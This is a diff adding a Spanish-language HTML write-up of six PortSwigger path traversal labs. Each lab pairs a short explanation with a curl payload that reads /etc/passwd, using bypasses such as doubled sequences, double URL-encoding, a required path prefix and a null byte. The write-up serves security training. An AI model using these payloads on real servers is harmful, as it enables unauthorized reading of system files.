@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Path Traversal | PortSwigger · cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <style>
+    .code-block { background:#0a0a0a; border:1px solid #333; border-radius:6px; padding:1rem; overflow-x:auto; color:#9fef00; font-size:0.85rem; }
+  </style>
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <div class="d-flex gap-2">
+        <a href="../writeups.html#portswigger" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> PortSwigger</a>
+        <a href="../writeups.html" class="btn btn-sm btn-outline-secondary"><i class="bi bi-house"></i> Inicio</a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="mb-4 p-4 rounded" style="background:#111;border:1px solid #222">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge fs-6" style="background:#ff6633">PortSwigger</span>
+        <span class="badge bg-warning text-dark fs-6">Path Traversal</span>
+        <span class="badge bg-secondary">Directory Traversal</span>
+        <span class="badge bg-secondary">Filter Bypass</span>
+        <span class="badge bg-secondary">Null Byte</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Path Traversal</h1>
+      <p class="text-secondary mb-0">Lectura de archivos arbitrarios mediante directory traversal: caso simple, bypass de rutas absolutas, secuencias dobladas, URL-encoding doble, validación de prefijo y null byte bypass.</p>
+    </div>
+
+    <!-- Reading arbitrary files -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-folder2-open"></i> Reading arbitrary files via directory traversal</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 1</span>File path traversal, simple case</h5>
+      <p class="text-secondary">La página es vulnerable en el parámetro <code>filename</code> de la visualización de imágenes. Usar <code>../</code> para subir directorios y leer <code>/etc/passwd</code>.</p>
+      <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=../../../etc/passwd"</code></pre>
+      <img src="../img/path1.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <!-- Common obstacles -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-shield-exclamation"></i> Common obstacles to exploiting path traversal</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 2</span>Traversal sequences blocked with absolute path bypass</h5>
+      <p class="text-secondary">El servidor bloquea las secuencias <code>../</code>. Usar una ruta absoluta directa en su lugar.</p>
+      <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=/etc/passwd"</code></pre>
+      <img src="../img/path2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 3</span>Traversal sequences stripped non-recursively</h5>
+      <p class="text-secondary">El servidor reemplaza <code>..</code> por <code>.</code> y <code>../</code> por <code>/</code> de forma no recursiva. Doblar las secuencias para que después de la sustitución quede el traversal correcto.</p>
+      <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=....//....//....//etc/passwd"</code></pre>
+      <img src="../img/path3.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 4</span>Traversal sequences stripped with superfluous URL-decode</h5>
+      <p class="text-secondary">El servidor sanitiza con URL-decode. Encodificar <code>../</code> dos veces (<code>%252f</code> → primera decodificación da <code>%2f</code> → segunda da <code>/</code>).</p>
+      <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=..%252f..%252f..%252fetc/passwd"</code></pre>
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 5</span>Validation of start of path</h5>
+      <p class="text-secondary">El servidor valida que el path comience con <code>/var/www/images/</code>. Incluir ese prefijo y luego hacer traversal para salir del directorio.</p>
+      <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd"</code></pre>
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 6</span>Validation of file extension with null byte bypass</h5>
+      <p class="text-secondary">El servidor requiere extensión <code>.png</code>. Usar el byte nulo <code>%00</code> para terminar la cadena antes de la extensión.</p>
+      <pre class="code-block"><code>curl -i "https://LAB-ID.web-security-academy.net/image?filename=../../../../etc/passwd%00.png"</code></pre>
+    </section>
+
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
